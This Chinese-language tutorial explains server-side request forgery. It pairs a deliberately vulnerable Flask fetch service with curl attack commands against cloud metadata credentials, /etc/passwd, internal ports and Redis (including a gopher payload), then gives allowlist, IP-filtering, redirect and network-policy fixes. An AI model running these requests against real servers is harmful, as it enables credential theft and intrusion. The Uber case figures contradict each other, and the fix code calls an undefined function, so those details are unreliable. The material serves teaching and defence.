# SSRF 服务端请求伪造（Server-Side Request Forgery）

> **一句话定义**：攻击者利用服务端功能发起内网请求，绕过防火墙访问内部系统或云服务元数据。

**危险等级**：🔴 严重
**OWASP Top 10 2021**：A10 — SSRF（第 10 位，2021 年新加入 Top 10）

---

## 原理深度分析

### 为什么发生

SSRF 发生在**服务端从用户输入获取 URL 并发起请求**的场景中。如果不对 URL 做限制，攻击者可以：

1. **访问内网服务**：`http://127.0.0.1:6379` 攻击 Redis
2. **读取云元数据**：`http://169.254.169.254/latest/meta-data/`（AWS/GCP）
3. **扫描内网端口**：`http://10.0.0.1:8080` 探测内网服务
4. **使用 file:// 协议读文件**：`file:///etc/passwd`

### 常见触发点

```python
# 典型的有 SSRF 风险的场景
url = request.args.get('url')
# 获取远程图片、预览链接、代理请求、Webhook 回调...

# 🔴 漏洞：没有对 URL 做任何限制
response = requests.get(url)  # 或 urllib.urlopen(url)
```

---

## 真实世界案例

### 案例 1：Capital One 数据泄露（2019）

**1.06 亿**客户数据因 SSRF 泄露。

- **攻击方式**：攻击者利用 AWS 元数据服务的 SSRF 漏洞获取 IAM 角色凭证
- **利用链**：SSRF → 访问 `169.254.169.254` → 获取 AWS 凭证 → 访问 S3 存储桶
- **后果**：罚款 **1.9 亿美元**，是历史上最大的银行数据泄露罚款之一

### 案例 2：阿里云 ECS SSRF（2019）

阿里云 ECS 实例元数据服务被多次报告可通过 SSRF 访问。

- **攻击方式**：Web 应用中的 SSRF 漏洞 → 访问 `100.100.100.204`（阿里云内网元数据）
- **后果**：攻击者获取云服务器临时访问凭证，进入内网
- **教训**：云服务商的内网 IP 段也需要列入黑名单

### 案例 3：Uber SSRF → S3 泄露（2016）

Uber 的 SSRF 漏洞导致 **5700 万**用户数据泄露。

- **攻击方式**：Uber 的公共代码仓库中包含 AWS 凭证
- **利用链**：SSRF → AWS 元数据 → 访问 S3 → 5.7 万用户数据
- **教训**：SSRF + 凭证泄露的组合杀伤力巨大

---

## 简单 POC

### 靶场代码

```python
# app.py — 有 SSRF 漏洞的图片下载服务
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch-image')
def fetch_image():
    url = request.args.get('url', '')
    
    # 🔴 漏洞：直接请求用户提供的 URL
    try:
        response = requests.get(url, timeout=5)
        return response.content, 200, {'Content-Type': response.headers.get('Content-Type', 'image/png')}
    except Exception as e:
        return f"错误: {e}"

if __name__ == '__main__':
    app.run(port=5003, debug=True)
```

### 攻击演示

```bash
# 正常使用 — 获取远程图片
curl "http://localhost:5003/fetch-image?url=https://example.com/image.png"

# SSRF — 访问本地服务
curl "http://localhost:5003/fetch-image?url=http://127.0.0.1:5003/admin"

# SSRF — 访问云元数据（AWS）
curl "http://localhost:5003/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# SSRF — 读取文件（如果支持 file://）
curl "http://localhost:5003/fetch-image?url=file:///etc/passwd"

# SSRF — 内网端口扫描
for port in 80 443 8080 3306 6379 27017; do
    curl -s -o /dev/null -w "%{http_code}" "http://localhost:5003/fetch-image?url=http://10.0.0.1:$port"
    echo " : port $port"
done

# SSRF — Redis 未授权访问
curl "http://localhost:5003/fetch-image?url=http://127.0.0.1:6379/"
# 如果 Redis 未授权，可以执行命令
curl "http://localhost:5003/fetch-image?url=http://127.0.0.1:6379/info"
```

### 高级 SSRF：利用 gopher 协议

```bash
# gopher 协议可以构造任意 TCP 数据包
# 利用 Redis 未授权访问写入 SSH 公钥

# 需要 gopher:// 支持（Python urllib 支持，requests 不支持）
curl "http://localhost:5003/fetch-image?url=gopher://127.0.0.1:6379/_*3%0d%0a\$3%0d%0aset%0d%0a..."
```

---

## 修复方案

### 方案 1：URL 白名单 ⭐⭐⭐⭐⭐

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = [
    'images.example.com',
    'cdn.example.com',
]

def is_safe_url(url):
    parsed = urlparse(url)
    
    # 1. 只允许 http/https
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # 2. 检查域名白名单
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    
    # 3. 禁止内网地址
    if is_private_ip(parsed.hostname):
        return False
    
    return True

def is_private_ip(host):
    import socket
    try:
        ip = socket.gethostbyname(host)
        private_ranges = [
            ('127.0.0.0', '127.255.255.255'),
            ('10.0.0.0', '10.255.255.255'),
            ('172.16.0.0', '172.31.255.255'),
            ('192.168.0.0', '192.168.255.255'),
            ('169.254.0.0', '169.254.255.255'),  # 云元数据
        ]
        for start, end in private_ranges:
            if compare_ip(ip, start, end):
                return True
        return False
    except:
        return True  # 无法解析时拒绝请求

@app.route('/fetch-image-fixed')
def fetch_image_fixed():
    url = request.args.get('url', '')
    
    if not is_safe_url(url):
        return "URL 不被允许", 403
    
    response = requests.get(url, timeout=5)
    return response.content
```

### 方案 2：DNS 解析 + IP 过滤 ⭐⭐⭐⭐

```python
import socket

def is_dangerous_ip(url):
    """解析域名并检查是否指向内网 IP"""
    parsed = urlparse(url)
    try:
        ip = socket.gethostbyname(parsed.hostname)
    except:
        return True
    
    private_prefixes = [
        '127.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
        '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
        '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
        '172.30.', '172.31.', '192.168.', '169.254.', '0.',
        '100.64.', '100.65.', '100.66.', '100.67.', '100.68.',
        '100.69.', '100.70.', '100.71.', '100.72.', '100.73.',
        '100.74.', '100.75.', '100.76.', '100.77.', '100.78.',
        '100.79.', '100.80.', '100.81.', '100.82.', '100.83.',
        '100.84.', '100.85.', '100.86.', '100.87.', '100.88.',
        '100.89.', '100.90.', '100.91.', '100.92.', '100.93.',
        '100.94.', '100.95.', '100.96.', '100.97.', '100.98.',
        '100.99.', '100.100.', '100.101.', '100.102.', '100.103.',
        '100.104.', '100.105.', '100.106.', '100.107.', '100.108.',
        '100.109.', '100.110.', '100.111.', '100.112.', '100.113.',
        '100.114.', '100.115.', '100.116.', '100.117.', '100.118.',
        '100.119.', '100.120.', '100.121.', '100.122.', '100.123.',
        '100.124.', '100.125.', '100.126.', '100.127.',
    ]
    
    return any(ip.startswith(p) for p in private_prefixes)
```

### 方案 3：禁用重定向 ⭐⭐⭐⭐

```python
# 攻击者可以通过 DNS 重定向绕过
# 初始解析到安全域名，服务端请求时 DNS 被重定向到内网

# ✅ 设置 max_redirects=0 或检查重定向后的 URL
response = requests.get(url, allow_redirects=False, timeout=5)

# 如果返回 3xx，手动验证 Location 头
if 300 <= response.status_code < 400:
    redirect_url = response.headers.get('Location', '')
    if not is_safe_url(redirect_url):
        return "重定向目标不被允许", 403
```

### 方案 4：最小网络策略 ⭐⭐⭐⭐⭐

```yaml
# Kubernetes NetworkPolicy — 限制 pod 只能访问外部指定域名
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ssrf-protection
spec:
  podSelector:
    matchLabels:
      app: web-server
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
              - 169.254.0.0/16
```

---

## 检测与防御工具

| 工具 | 用途 |
|------|------|
| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | SSRF 自动化测试框架 |
| [Gopherus](https://github.com/tarunkant/Gopherus) | 生成 gopher 协议 payload |
| [See-SU](https://github.com/AlphabugSec/See-SU) | 在 DNS 层面检测 SSRF |
| [Interactsh](https://github.com/projectdiscovery/interactsh) | OOB 带外检测平台 |

---

## 延伸阅读

1. [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
2. [PortSwigger SSRF 指南](https://portswigger.net/web-security/ssrf)
3. [AWS 元数据服务 SSRF 指南](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
4. [Capital One 数据泄露技术分析](https://www.zdnet.com/article/capital-one-data-breach-how-the-attacker-executed-it/)
5. [Gopher 协议 SSRF 利用](https://blog.chaitanyapillai.com/what-is-gopher-protocol-how-to-exploit-ssrf-with-gopher/)
